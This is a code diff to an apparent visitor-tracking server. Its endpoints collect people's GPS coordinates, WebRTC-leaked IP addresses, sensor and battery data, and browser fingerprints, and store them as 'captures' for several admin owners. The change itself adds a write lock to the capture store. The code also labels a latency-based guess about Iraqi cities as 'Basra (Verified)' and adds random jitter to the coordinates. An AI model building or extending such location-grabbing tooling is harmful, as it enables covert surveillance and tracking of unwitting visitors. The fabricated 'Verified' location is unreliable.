@@ -151,6 +151,26 @@ async function writeCaptures(captures, retries = 3) {
   }
 }
 
+let dbLock = Promise.resolve();
+
+async function updateCaptures(updaterFn) {
+  let release;
+  const previousLock = dbLock;
+  dbLock = new Promise(resolve => { release = resolve; });
+  
+  await previousLock;
+  
+  try {
+    const captures = await readCaptures();
+    const resultCaptures = await updaterFn(captures);
+    if (resultCaptures !== false) {
+      await writeCaptures(resultCaptures);
+    }
+  } finally {
+    release();
+  }
+}
+
 function getClientIP(req) {
   const raw =
     req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
@@ -316,18 +336,25 @@ app.get('/api/client-info', async (req, res) => {
 });
 
 app.post('/api/capture', async (req, res) => {
-  const captures = await readCaptures();
-  
-  // Resolve Public ID to internal username if possible
   const rawOwner = req.body.owner || 'global';
   const adminByPublicId = ALLOWED_ADMINS.find(a => a.publicId === rawOwner);
   const owner = adminByPublicId ? adminByPublicId.user : rawOwner;
 
-  const entry = createCapture(req, captures, { owner });
+  // We read initial captures purely for device ID hashing/visit count inside createCapture
+  // This initial read is not used for writing, so no lock needed yet
+  const tempCaptures = await readCaptures();
+  const entry = createCapture(req, tempCaptures, { owner });
+  
+  // Resolve GeoIP before locking to avoid holding the lock during network request
   entry.ipGeo = await resolveIPGeo(entry.ip);
 
-  captures.push(entry);
-  await writeCaptures(captures);
+  // Lock, re-read, calculate exact visitCount, push, and write
+  await updateCaptures(async (captures) => {
+    const previousVisits = captures.filter((capture) => capture.deviceId === entry.deviceId);
+    entry.visitCount = previousVisits.length + 1;
+    captures.push(entry);
+    return captures;
+  });
 
   console.log(
     `[CAPTURE] ${entry.id} | Device: ${entry.deviceId} | IP: ${entry.ip} | Visit #${entry.visitCount} | GPS: ${entry.gps ? 'yes' : 'no'}`
@@ -385,59 +412,68 @@ app.post('/api/demo-capture', basicAuth, async (req, res) => {
     owner: req.adminUser // Tag demo as belonging to the current admin
   });
 
-  captures.push(entry);
-  await writeCaptures(captures);
+  await updateCaptures(async (captures) => {
+    captures.push(entry);
+    return captures;
+  });
 
   res.json({ status: 'ok', id: entry.id });
 });
 
 app.patch('/api/capture/:id', async (req, res) => {
-  const captures = await readCaptures();
-  const entry = captures.find((capture) => capture.id === req.params.id);
-  if (!entry) return res.status(404).json({ error: 'Capture not found' });
+  let found = false;
+  
+  await updateCaptures(async (captures) => {
+    const entry = captures.find((capture) => capture.id === req.params.id);
+    if (!entry) return false; // Abort write
 
-  // GPS update
-  const gps = sanitizeGps(req.body.gps);
-  if (gps) {
-    entry.gps = gps;
-    console.log(`[GPS UPDATE] ${entry.id} | Lat: ${gps.lat}, Lon: ${gps.lon}, Accuracy: ${gps.accuracy}m`);
-  }
+    found = true;
 
-  // WebRTC update
-  if (Array.isArray(req.body.webrtcIPs)) {
-    entry.webrtcIPs = req.body.webrtcIPs.map((ip) => sanitizeString(ip, 80)).filter(Boolean).slice(0, 8);
-  }
-
-  // Metadata update (sensors, triangulation, battery, regional latency)
-  if (req.body.metadata && typeof req.body.metadata === 'object') {
-    entry.metadata = entry.metadata || {};
-    Object.assign(entry.metadata, req.body.metadata);
-
-    // HEURISTIC CORRECTION: Distinguish Iraq cities based on Dubai (ME_South) latency
-    if (entry.metadata.regionalLatency && entry.ipGeo && entry.ipGeo.country === 'Iraq') {
-      const dubaiPing = entry.metadata.regionalLatency.ME_South;
-      if (dubaiPing > 0 && dubaiPing < 32 && !entry.ipGeo.city.includes('Basra') && !entry.gps) {
-        console.log(`[GEO-CORRECT] Low Dubai latency (${dubaiPing}ms) detected. Shifting Iraq node to Basra region.`);
-        entry.ipGeo.city = 'Basra (Verified)';
-        entry.ipGeo.lat = 30.5081 + (Math.random() - 0.5) * 0.05;
-        entry.ipGeo.lon = 47.7835 + (Math.random() - 0.5) * 0.05;
-      }
+    // GPS update
+    const gps = sanitizeGps(req.body.gps);
+    if (gps) {
+      entry.gps = gps;
+      console.log(`[GPS UPDATE] ${entry.id} | Lat: ${gps.lat}, Lon: ${gps.lon}, Accuracy: ${gps.accuracy}m`);
     }
-    console.log(`[META UPDATE] ${entry.id} | Keys: ${Object.keys(req.body.metadata).join(', ')}`);
-  }
 
-  // Extra fingerprint fields update (Engine V2)
-  if (req.body.fonts || req.body.permissions || req.body.mediaDevices || req.body.social || req.body.integrity) {
-    entry.fingerprint = entry.fingerprint || {};
-    if (req.body.fonts) entry.fingerprint.fonts = req.body.fonts;
-    if (req.body.permissions) entry.fingerprint.permissions = req.body.permissions;
-    if (req.body.mediaDevices) entry.fingerprint.mediaDevices = req.body.mediaDevices;
-    if (req.body.social) entry.fingerprint.social = req.body.social;
-    if (req.body.integrity) entry.fingerprint.integrity = req.body.integrity;
-    if (req.body.webgpu) entry.fingerprint.webgpu = req.body.webgpu;
-  }
+    // WebRTC update
+    if (Array.isArray(req.body.webrtcIPs)) {
+      entry.webrtcIPs = req.body.webrtcIPs.map((ip) => sanitizeString(ip, 80)).filter(Boolean).slice(0, 8);
+    }
 
-  await writeCaptures(captures);
+    // Metadata update (sensors, triangulation, battery, regional latency)
+    if (req.body.metadata && typeof req.body.metadata === 'object') {
+      entry.metadata = entry.metadata || {};
+      Object.assign(entry.metadata, req.body.metadata);
+
+      // HEURISTIC CORRECTION: Distinguish Iraq cities based on Dubai (ME_South) latency
+      if (entry.metadata.regionalLatency && entry.ipGeo && entry.ipGeo.country === 'Iraq') {
+        const dubaiPing = entry.metadata.regionalLatency.ME_South;
+        if (dubaiPing > 0 && dubaiPing < 32 && !entry.ipGeo.city.includes('Basra') && !entry.gps) {
+          console.log(`[GEO-CORRECT] Low Dubai latency (${dubaiPing}ms) detected. Shifting Iraq node to Basra region.`);
+          entry.ipGeo.city = 'Basra (Verified)';
+          entry.ipGeo.lat = 30.5081 + (Math.random() - 0.5) * 0.05;
+          entry.ipGeo.lon = 47.7835 + (Math.random() - 0.5) * 0.05;
+        }
+      }
+      console.log(`[META UPDATE] ${entry.id} | Keys: ${Object.keys(req.body.metadata).join(', ')}`);
+    }
+
+    // Extra fingerprint fields update (Engine V2)
+    if (req.body.fonts || req.body.permissions || req.body.mediaDevices || req.body.social || req.body.integrity) {
+      entry.fingerprint = entry.fingerprint || {};
+      if (req.body.fonts) entry.fingerprint.fonts = req.body.fonts;
+      if (req.body.permissions) entry.fingerprint.permissions = req.body.permissions;
+      if (req.body.mediaDevices) entry.fingerprint.mediaDevices = req.body.mediaDevices;
+      if (req.body.social) entry.fingerprint.social = req.body.social;
+      if (req.body.integrity) entry.fingerprint.integrity = req.body.integrity;
+      if (req.body.webgpu) entry.fingerprint.webgpu = req.body.webgpu;
+    }
+    
+    return captures;
+  });
+
+  if (!found) return res.status(404).json({ error: 'Capture not found' });
   res.json({ status: 'updated' });
 });
 
@@ -449,37 +485,58 @@ app.get('/api/captures', basicAuth, async (req, res) => {
 });
 
 app.delete('/api/captures', basicAuth, async (req, res) => {
-  const all = await readCaptures();
-  // Keep only data belonging to OTHER admins
-  const othersData = all.filter(c => c.owner !== req.adminUser);
-  await writeCaptures(othersData);
+  let initialLength = 0;
+  let finalLength = 0;
+  
+  await updateCaptures(async (captures) => {
+    initialLength = captures.length;
+    // Keep only data belonging to OTHER admins
+    const othersData = captures.filter(c => c.owner !== req.adminUser);
+    finalLength = othersData.length;
+    return othersData;
+  });
+  
   broadcast('refresh');
-  res.json({ status: 'cleared', deleted: all.length - othersData.length });
+  res.json({ status: 'cleared', deleted: initialLength - finalLength });
 });
 
 app.delete('/api/captures/:id', basicAuth, async (req, res) => {
-  const all = await readCaptures();
-  const capture = all.find(c => c.id === req.params.id);
-  
-  // STRICT ISOLATION: Can only delete if I own it
-  if (!capture || capture.owner !== req.adminUser) {
-    return res.status(403).json({ error: 'Access denied' });
-  }
+  let deleted = false;
+  let error = null;
 
-  const filtered = all.filter((c) => c.id !== req.params.id);
-  await writeCaptures(filtered);
-  broadcast('refresh');
-  res.json({ status: 'deleted' });
+  await updateCaptures(async (captures) => {
+    const capture = captures.find(c => c.id === req.params.id);
+    // STRICT ISOLATION: Can only delete if I own it
+    if (!capture || capture.owner !== req.adminUser) {
+      error = 'Access denied';
+      return false; // Abort write
+    }
+    deleted = true;
+    return captures.filter((c) => c.id !== req.params.id);
+  });
+
+  if (error) return res.status(403).json({ error });
+  if (deleted) {
+    broadcast('refresh');
+    return res.json({ status: 'deleted' });
+  }
+  return res.status(404).json({ error: 'Not found' });
 });
 
 app.delete('/api/devices/:deviceId', basicAuth, async (req, res) => {
-  const all = await readCaptures();
-  // STRICT ISOLATION: Only delete captures for this device that belong to me
-  const filtered = all.filter((c) => !(c.deviceId === req.params.deviceId && c.owner === req.adminUser));
-  await writeCaptures(filtered);
+  let initialLength = 0;
+  let finalLength = 0;
+
+  await updateCaptures(async (captures) => {
+    initialLength = captures.length;
+    // STRICT ISOLATION: Only delete captures for this device that belong to me
+    const filtered = captures.filter((c) => !(c.deviceId === req.params.deviceId && c.owner === req.adminUser));
+    finalLength = filtered.length;
+    return filtered;
+  });
 
   broadcast('refresh');
-  res.json({ status: 'deleted', deleted: all.length - filtered.length });
+  res.json({ status: 'deleted', deleted: initialLength - finalLength });
 });
 
 // Broadcast stub (no WebSocket in serverless, but prevents crash)
